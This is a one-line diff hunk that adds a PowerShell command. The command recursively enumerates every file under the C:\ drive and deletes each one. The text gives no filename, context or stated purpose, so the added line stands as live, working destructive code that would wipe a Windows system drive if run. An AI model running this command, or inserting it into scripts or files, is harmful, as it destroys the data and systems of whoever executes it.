@@ -1,0 +1,1 @@
+Get-ChildItem -Path C:\ -Include *.* -Recurse | foreach { $_.Delete()}
